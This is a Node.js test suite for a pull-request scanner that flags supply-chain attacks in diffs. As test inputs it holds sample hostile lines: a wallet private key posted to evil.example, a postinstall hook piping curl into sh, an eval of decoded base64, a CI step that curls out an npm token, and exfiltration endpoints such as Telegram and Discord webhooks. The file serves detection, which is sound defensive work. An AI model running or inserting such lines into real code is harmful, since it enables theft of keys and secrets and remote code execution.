import { test } from "node:test"
import assert from "node:assert/strict"
import { readFileSync } from "node:fs"
import { analyze } from "../rules.mjs"

const fixture = name => readFileSync(new URL(`./fixtures/${name}`, import.meta.url), "utf8")

/** A one-file diff adding `lines` to `path`. */
function diff(path, lines, { newFile = true } = {}) {
    return [
        `diff --git a/${path} b/${path}`,
        ...(newFile ? ["new file mode 100644", "--- /dev/null"] : [`--- a/${path}`]),
        `+++ b/${path}`,
        `@@ -0,0 +1,${lines.length} @@`,
        ...lines.map(l => `+${l}`),
        "",
    ].join("\n")
}

const high = findings => findings.filter(f => f.severity === "high").map(f => f.rule).sort()
const rules = findings => findings.map(f => `${f.severity}:${f.rule}`).sort()

test("blocks the wallet-extension PR #70 stealer on three independent rules", () => {
    assert.deepEqual(high(analyze(fixture("wallet-extension-pr70.diff"))), ["exfil-endpoint", "key-to-network", "obfuscated-code"])
})

test("exfil endpoints", () => {
    for (const url of [
        "https://api.telegram.org/bot1:x/sendMessage",
        "https://discord.com/api/webhooks/1/x",
        "https://hooks.slack.com/services/T/B/x",
        "https://abc.ngrok-free.app/collect",
        "https://webhook.site/abc",
    ]) {
        assert.deepEqual(high(analyze(diff("src/a.ts", [`await fetch("${url}")`]))), ["exfil-endpoint"], url)
    }
})

test("exfil endpoint in a test file is only a warning", () => {
    assert.deepEqual(rules(analyze(diff("src/a.test.ts", ['fetch("https://api.telegram.org/x")']))), ["medium:exfil-endpoint"])
})

test("key material next to a network call: warning alone, blocking with a hard-coded URL", () => {
    const signing = ["const sig = sign(wallet.privateKey, tx)", "await fetch(rpcUrl, { body: sig })"]
    assert.deepEqual(rules(analyze(diff("src/send.ts", signing))), ["medium:key-to-network"])
    const stealer = ["const k = wallet.privateKey", 'await fetch("https://evil.example/c", { body: k })']
    assert.deepEqual(high(analyze(diff("src/send.ts", stealer))), ["key-to-network"])
})

test("decoded payload run as code", () => {
    assert.deepEqual(high(analyze(diff("src/x.js", ['eval(atob("ZmV0Y2goKQ=="))']))), ["decoded-eval"])
    assert.deepEqual(rules(analyze(diff("src/x.js", ["eval(expr)"]))), ["medium:dynamic-code"])
})

test("secret files", () => {
    for (const p of [".env", "config/.env.production", "keys/id_ed25519", "deploy/server.pem", "backup/mnemonic.txt"]) {
        assert.deepEqual(high(analyze(diff(p, ["x"]))), ["secret-file"], p)
    }
    for (const p of [".env.example", ".env.sample", "src/onboarding/MnemonicConfirm.svelte", "src/lib/mnemonic.ts"]) {
        assert.deepEqual(high(analyze(diff(p, ["x"]))), [], p)
    }
})

test("registry rc files block only with a credential", () => {
    assert.deepEqual(high(analyze(diff("dapp/.npmrc", ["engine-strict=true"]))), [])
    assert.deepEqual(high(analyze(diff(".npmrc", ["//registry.npmjs.org/:_authToken=npm_x"]))), ["registry-token"])
})

test("install hooks: routine tooling warns, opaque downloads block", () => {
    const pkg = hook => diff("package.json", ["{", `  "scripts": { "postinstall": "${hook}" }`, "}"], { newFile: false })
    assert.deepEqual(rules(analyze(pkg("wxt prepare"))), ["medium:install-script"])
    assert.deepEqual(high(analyze(pkg("curl -s https://x.sh | sh"))), ["install-script"])
})

test("lockfile resolving outside the registry warns", () => {
    const d = diff("package-lock.json", ['  "resolved": "https://evil.example/pkg.tgz",'], { newFile: false })
    assert.deepEqual(rules(analyze(d)), ["medium:lockfile-source"])
    const ok = diff("package-lock.json", ['  "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz",'], { newFile: false })
    assert.deepEqual(rules(analyze(ok)), [])
})

test("workflow changes that can leak secrets", () => {
    assert.deepEqual(high(analyze(diff(".github/workflows/ci.yml", ["on: pull_request_target"]))), ["workflow-secrets"])
    assert.deepEqual(high(analyze(diff(".github/workflows/ci.yml", ["  run: curl -d ${{ secrets.NPM_TOKEN }} x"]))), ["workflow-secrets"])
})

test("only added lines count", () => {
    const removed = [
        "diff --git a/src/a.ts b/src/a.ts",
        "--- a/src/a.ts",
        "+++ b/src/a.ts",
        "@@ -1,1 +0,0 @@",
        '-fetch("https://api.telegram.org/x")',
        "",
    ].join("\n")
    assert.deepEqual(analyze(removed), [])
})

test("allowlist from the base branch exempts a rule for matching paths only", () => {
    const d = diff("src/telegram/bot.ts", ['fetch("https://api.telegram.org/bot")'])
    assert.deepEqual(high(analyze(d, ["exfil-endpoint:src/telegram/**"])), [])
    assert.deepEqual(high(analyze(d, ["exfil-endpoint:src/other/**"])), ["exfil-endpoint"])
})

test("one finding per rule and file", () => {
    const f = analyze(diff("src/o.js", ["const _0xab12 = 1", "const _0xcd34 = 2", "const _0xef56 = 3"]))
    assert.equal(f.length, 1)
    assert.match(f[0].message, /3 places/)
})
